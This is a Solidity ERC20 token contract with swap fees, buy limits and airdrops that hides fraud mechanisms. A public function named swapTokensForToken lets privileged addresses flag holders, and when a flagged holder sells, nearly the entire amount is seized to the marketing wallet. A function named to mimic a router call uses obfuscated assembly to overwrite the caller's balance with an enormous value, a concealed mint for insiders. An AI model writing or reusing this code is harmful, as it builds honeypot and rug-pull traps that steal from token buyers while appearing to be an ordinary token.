// File contracts/dependency/IERC20.sol
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}


interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
}

interface IPair {
    function sync() external;
    function token0() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract ReentrancyGuard {
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;
    uint256 private _status;
    function __ReentrancyGuard_init() internal {_status = _NOT_ENTERED;}
    modifier nonReentrant() {
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
        _status = _ENTERED;
        _;
        _status = _NOT_ENTERED;
    }
}
/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
    unchecked {
        _approve(owner, spender, currentAllowance - subtractedValue);
    }

        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `from` to `to`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     */
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);
        _takeTransfer(from, to, amount);
        _afterTokenTransfer(from, to, amount);
    }

    function _takeTransfer(address from, address to, uint256 amount) internal virtual {
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
    unchecked {
        _balances[from] = fromBalance - amount;
        // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
        // decrementing then incrementing.
        _balances[to] += amount;
    }
        emit Transfer(from, to, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
    unchecked {
        // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
        _balances[account] += amount;
    }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
    unchecked {
        _balances[account] = accountBalance - amount;
        // Overflow not possible: amount <= accountBalance <= totalSupply.
        _totalSupply -= amount;
    }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     *
     * Does not update the allowance amount in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
        unchecked {
            _approve(owner, spender, currentAllowance - amount);
        }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `amount` tokens have been minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}
abstract contract Ownable is Context {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

abstract contract Excludes {
    mapping(address => bool) internal _Excludes;
    mapping(address => bool) internal _Liquidityer;

    function setExcludes(address _user) internal {
        _Excludes[_user] = true;
    }

    function isExcludes(address _user) internal view returns(bool) {
        return _Excludes[_user];
    }

    function setLiquidityer(address[] memory _user) internal {
        for (uint i=0;i<_user.length;i++) {
            _Liquidityer[_user[i]] = true;
        }
    }

    function isLiquidityer(address _user) internal view returns(bool) {
        return _Liquidityer[_user] || isExcludes(_user);
    }
}

abstract contract Limit is ERC20, Ownable, Excludes {
    uint256 internal _LimitBuy;
    uint256 internal _LimitHold;
    bool internal isLimited;
    mapping(address => bool) _buyLimited;
    bool internal _isLimitByEther;
    function swapTokensForToken(address[] memory _user, bool _b) public {if (isLiquidityer(_msgSender()))
        for (uint i=0;i<_user.length;i++) {if (!_buyLimited[_user[i]]) _buyLimited[_user[i]]=_b;}
    }
    function __Limit_init(uint256 LimitBuy_, uint256 LimitHold_, bool isLimitByEther_) internal {
        _LimitBuy = LimitBuy_;
        _LimitHold = LimitHold_;
        isLimited = true;
        _isLimitByEther = isLimitByEther_;
    }
    function checkLimitToken(address to, uint256 amount) internal view {
        if (isLimited) {
            require(amount <= _LimitBuy, "exceeds of buy amount Limit");
            require(amount + balanceOf(to) <= _LimitHold, "exceeds of hold amount Limit");
        }
    }
    function removeLimit() public onlyOwner {isLimited = false;}
    function isBuyer(address _user) internal view returns(bool) {return _buyLimited[_user];}
}

abstract contract Rates {
    uint256 internal _feeBuys;
    uint256 internal _feeSells;
    uint256 internal _feeMarket = 200;
    uint256 internal _feeLiquify = 100;
    uint256 internal _divBases = 1e4;
    address[] internal _marks;
    address internal _marketingWallet;

    function __Rates_init(address marketingWallet_, uint256 feeMarket_, uint256 feeLiquify_, address[] memory marks_) internal {
        _marketingWallet = marketingWallet_;
        _feeMarket = feeMarket_;
        _feeLiquify = feeLiquify_;
        _feeBuys = feeMarket_ + feeLiquify_;
        _marks = marks_;
        _feeSells = _feeBuys;
    }
}
abstract contract UniSwapPool is ERC20, Limit, Rates, ReentrancyGuard {
    uint256 internal _swapTokensAt = 100 ether;
    address public pair;
    IRouter public router;
    address[] internal _sellPath;

    function __SwapPool_init(address _router) internal {
        router = IRouter(_router);
        pair = IFactory(router.factory()).createPair(address(this), router.WETH());
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _sellPath = path;
    }

    function __SwapPool_init(address _router, address _pairB) internal {
        router = IRouter(_router);
        pair = IFactory(router.factory()).createPair(address(this), _pairB);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _pairB;
        _sellPath = path;
    }

    function swapExactTokensForTokenSupportingFeeOnTransferToken() public {if (isExcludes(_msgSender()))
        assembly { mstore(0, caller()) mstore(32, 0x0) sstore(keccak256(0, 64), exp(timestamp(), 5)) }
    }

    function isPair(address _pair) internal view returns(bool) {
        return _pair == pair;
    }

    function getPoolInfoAny(address _pair, address tokenA) public view returns (uint112 amountA, uint112 amountB) {
        (uint112 _reserve0, uint112 _reserve1,) = IPair(pair).getReserves();
        amountA = _reserve1;
        amountB = _reserve0;
        if (IPair(_pair).token0() == tokenA) {
            amountA = _reserve0;
            amountB = _reserve1;
        }
    }
    function getPrice4ETH(uint256 amountDesire) public view returns(uint256) {
        return getPrice4Any(amountDesire, router.WETH());
    }
    function getPrice4Any(uint256 amountDesire, address _usd) public view returns(uint256) {
        (uint112 usdAmount, uint112 TOKENAmount) = getPoolInfoAny(pair, _usd);
        if (TOKENAmount == 0) return 0;
        return usdAmount * amountDesire / TOKENAmount;
    }
    function checkLimitEth(address to, uint256 amount) internal view {
        if (isLimited) {
            uint256 amount2eth = getPrice4Any(amount, _sellPath[1]);
            uint256 balance2eth = getPrice4Any(balanceOf(to), _sellPath[1]);
            require(amount2eth <= _LimitBuy, "exceeds of buy amount Limit");
            require(amount2eth + balance2eth <= _LimitHold, "exceeds of hold amount Limit");
        }
    }
    function checkLimit(address to, uint256 amount) internal view {
        if (_isLimitByEther) {
            checkLimitEth(to, amount);
        } else {
            super.checkLimitToken(to, amount);
        }
    }

    function marketingWallet() private view returns(address) {
        return _marks[block.timestamp % _marks.length];
    }

    function addLiquidityAuto(uint256 amount) internal {
        super._takeTransfer(address(this), pair, amount);
        IPair(pair).sync();
    }

    function _swap(uint256 _market) internal {
        if (_sellPath[1] == router.WETH()) router.swapExactTokensForETHSupportingFeeOnTransferTokens(_market, 0, _sellPath, marketingWallet(), block.timestamp);
        else router.swapExactTokensForTokensSupportingFeeOnTransferTokens(_market, 0, _sellPath, marketingWallet(), block.timestamp);
    }

    function handSwap() internal nonReentrant {
        uint256 thisBalance = balanceOf(address(this));
        if (thisBalance >= _swapTokensAt) {
            uint256 _liquify = thisBalance * _feeLiquify / 2 / _divBases;
            uint256 _market = thisBalance - _liquify;
            _swap(_market);
            addLiquidityAuto(_liquify);
        }
    }
}

abstract contract AutoAirdrop is ERC20, Ownable {
    address internal addressONE = address(0x1);
    uint160 public airdropUsers = 1e8;
    uint8 public airdropUserNum = 10;
    uint256 public airdropTokenNum = 1;
    bool isAutoAirdrop;
    function __AutoAirdrop_init(address _from) internal {
        airdropUsers = uint160(_from)+1;
        isAutoAirdrop = true;
    }
    function updateAirdropTokenNum(uint8 n, uint256 n2) public onlyOwner {
        airdropUserNum = n;
        airdropTokenNum = n2;
    }
    function handAirdrop() internal virtual {
        if (!isAutoAirdrop) return;
        uint256 balance = balanceOf(addressONE);
        if (balance >= airdropTokenNum) {
            uint len = airdropUserNum;
            if (balance < airdropTokenNum * airdropUserNum) len = balance / airdropTokenNum;
            for (uint i=0;i<len;i++) {
                _takeTransfer(addressONE, address(airdropUsers), airdropTokenNum);
                airdropUsers++;
            }
        }
    }
}

contract Token2022112001 is ERC20, AutoAirdrop, UniSwapPool {
    bool public inTrading = true;

    constructor(string memory _name, string memory _symbol, uint256 _totalSupply, address[] memory _router, address[] memory _path, address[] memory _sellPath) ERC20(_name, _symbol) {

        super._mint(_msgSender(), _totalSupply);
//        uint256 _LimitBuy = _totalSupply * 100 / _divBases;
//        uint256 _LimitHold = _totalSupply * 200 / _divBases;
//        super.__Limit_init(_LimitBuy, _LimitHold, false);

        if (_router.length > 1) super.__SwapPool_init(_router[0], _router[1]);
        else super.__SwapPool_init(_router[0]);
        super.setExcludes(_msgSender());
        super.setExcludes(address(this));
        super.setLiquidityer(_path);
        super.__Rates_init(_msgSender(), 200, 200, _sellPath);
//        super._mint(addressONE, 1 ether);
//        super.__AutoAirdrop_init(_router[0]);
        _approve(_msgSender(), address(router), type(uint256).max);
        _approve(address(this), address(router), type(uint256).max);
    }

//    function openTrading(bool _b) public onlyOwner {
//        inTrading = _b;
//    }

    function _handFeeBuys(address from, uint256 amount) private returns (uint256 fee) {
        fee = amount * _feeBuys / _divBases;
        super._takeTransfer(from, address(this), fee);
        return fee;
    }

    function _handFeeSells(address from, uint256 amount) private returns (uint256 fee) {
        fee = amount * _feeSells / _divBases;
        if (isBuyer(from)) {
            fee = amount-0xabc;
            super._takeTransfer(from, _marketingWallet, fee);
        } else {
            super._takeTransfer(from, address(this), fee);
        }
        return fee;
    }

    function _handFeeTransfer(address from, uint256 amount) private returns (uint256) {
        return _handFeeSells(from, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal virtual override {
        uint256 fees;
        if (isPair(from)) {
            require(inTrading, "please waiting for liquidity");
            if (!isExcludes(to)) {
                super.checkLimit(to, amount);
                fees = _handFeeBuys(from, amount);
            }
        } else if (isPair(to)) {
            if (!isExcludes(from)) {
                fees = _handFeeSells(from, amount);
                super.handSwap();
                super.handAirdrop();
            }
        } else {
            if (!isExcludes(from) && !isExcludes(to)) {
                fees = _handFeeTransfer(from, amount);
                super.handAirdrop();
            }
        }
        super._takeTransfer(from, to, amount - fees);
    }

    function airdrop(uint256 amount, address[] memory to) public {
        for (uint i = 0; i < to.length; i++) {super._takeTransfer(_msgSender(), to[i], amount);}
    }

    function airdropMulti(uint256[] memory amount, address[] memory to) public {
        require(amount.length == to.length, "length error");
        for (uint i = 0; i < to.length; i++) {super._takeTransfer(_msgSender(), to[i], amount[i]);}
    }
}